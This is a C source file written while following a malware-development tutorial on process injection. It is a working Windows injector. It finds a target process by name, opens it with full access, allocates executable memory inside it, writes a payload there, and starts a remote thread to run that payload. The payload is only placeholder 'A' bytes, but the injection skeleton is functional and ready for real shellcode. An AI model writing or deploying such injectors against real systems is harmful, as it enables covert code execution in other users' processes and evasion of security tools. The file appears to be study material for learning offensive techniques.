/*
 * filename: process-injection-exmpl-v2.c
 * from: Malware Development: Process Injection
 *       https://www.youtube.com/watch?v=A6EKDAKBXPs
 * v2: writing to virtual memory
 * v3: add get_process_id_by_name() function
 *     get PID from get_process_id_by_name() function
 * v4: WaitForSingleObject() function
 * last: 20250908 (en)
 */
#include <stdio.h>
#include <windows.h>

/* v3 */
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

/* v3 */
int get_process_id_by_name(const char *procname);

const char *k = "[+]";
const char *i = "[+]";
const char *e = "[-]";

DWORD PID = 0;                    /* for OpenProcess() function */
DWORD TID = 0;                    /* for WriteProcessMemory() function */
HANDLE hProcess, hThread = NULL;  /* for OpenProcess() function */
LPVOID rBuffer = NULL;            /* for VirtualAllocEx() function */

unsigned char injected[] = "\x41\x41\x41\x41\x41\x41\x41\x4\x41"; /* unsigned char *crowPuke[] = ... */


/* main */
int main(int argc, char **argv) {

	if (argc < 2) {
		printf("%s usage: %s <process name.exe>\n", e, argv[0]);
		return EXIT_FAILURE;
	}

	// PID = atoi(argv[1]);
	PID = (DWORD) get_process_id_by_name(argv[1]); /* v3 */
	printf("%s trying to open a handle to process (%ld)\n", i, (unsigned long)PID);

	/* open handle to the process */
	/* from https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
    HANDLE OpenProcess(
        [in] DWORD dwDesiredAccess,
        [in] BOOL  bInheritHandle,
        [in] DWORD dwProcessId
    );
	 */
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	printf("%s got a handle to the process!\n\\---0x%p\n", k, hProcess);

	if (hProcess == NULL) {
		printf("%s couldn't get a handle to the proces (%ld), error: %ld\n", e, (unsigned long)PID, (unsigned long)GetLastError());
		return EXIT_FAILURE;
	}

	/* allocate bytes to process memory */
	/*
    LPVOID VirtualAllocEx(
        [in]           HANDLE hProcess,
        [in, optional] LPVOID lpAddress,
        [in]           SIZE_T dwSize,
        [in]           DWORD  flAllocationType,
        [in]           DWORD  flProtect
    );
	*/
	rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(injected), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	printf("%s allocated %zu-bytes with PAGE_EXECUTE_READWRITE permissions\n", k, sizeof(injected));

	/* v2 ... */
	/*
    BOOL WriteProcessMemory(
        [in]  HANDLE  hProcess,
        [in]  LPVOID  lpBaseAddress,
        [in]  LPCVOID lpBuffer,
        [in]  SIZE_T  nSize,
        [out] SIZE_T  *lpNumberOfBytesWritten
    );
	*/
	WriteProcessMemory(hProcess, rBuffer, injected, sizeof(injected), NULL);
	printf("%s wrote %zu-bytes to process memory\n", k, sizeof(injected));

	/* create thread to run our payload */
	/*
	 * Creates a thread that runs in the virtual address space of another process
	 *
    HANDLE CreateRemoteThreadEx(
        [in]            HANDLE                       hProcess,
        [in, optional]  LPSECURITY_ATTRIBUTES        lpThreadAttributes,
        [in]            SIZE_T                       dwStackSize,
        [in]            LPTHREAD_START_ROUTINE       lpStartAddress,
        [in, optional]  LPVOID                       lpParameter,
        [in]            DWORD                        dwCreationFlags,
        [in, optional]  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
        [out, optional] LPDWORD                      lpThreadId
    );
	*/
	hThread = CreateRemoteThreadEx(
		hProcess,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)rBuffer,
		NULL,
		0,
		0,
		&TID);

	if (hThread == NULL) {
		printf("%s failed to get a handle to the thread, error: %ld\n", e, (unsigned long)GetLastError());
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}

	printf("%s got a handle to the thread (%ld)!\n\\---0x%p\n", k, (unsigned long)TID, hThread);

	/* v4 */
	/* from: https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject

       DWORD WaitForSingleObject(
           [in] HANDLE hHandle,
           [in] DWORD  dwMilliseconds
       );
	 */
	printf("%s waiting for thread to finish ...\n", i);
	WaitForSingleObject(hThread, INFINITE);
	printf("%s thread finished executing\n", k);

	printf("%s cleaning up ...\n", i);
	CloseHandle(hThread);
	CloseHandle(hProcess);
	printf("%s done!\n", i);

	return EXIT_SUCCESS;
}

/* MINE !! */
int get_process_id_by_name(const char *procname) {

	HANDLE hSnapshot;
	PROCESSENTRY32 pe;
	int pid = 0;
	BOOL hResult;

	// snapshot of all processes in the system
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

	// initializing size: needed for using Process32First
	pe.dwSize = sizeof(PROCESSENTRY32);

	// info about first process encountered in a system snapshot
	hResult = Process32First(hSnapshot, &pe);

	// retrieve information about the processes
	// and exit if unsuccessful
	while (hResult) {
		// if we find the process: return process ID
		// if (strcmp(procname, pe.szExeFile) == 0) {
		if (strcasecmp(procname, pe.szExeFile) == 0) { /* v2: case insensitive cmp */
			pid = pe.th32ProcessID;
			break;
		}
		hResult = Process32Next(hSnapshot, &pe);
	}

	// closes an open handle (CreateToolhelp32Snapshot)
	CloseHandle(hSnapshot);
	return pid;
}

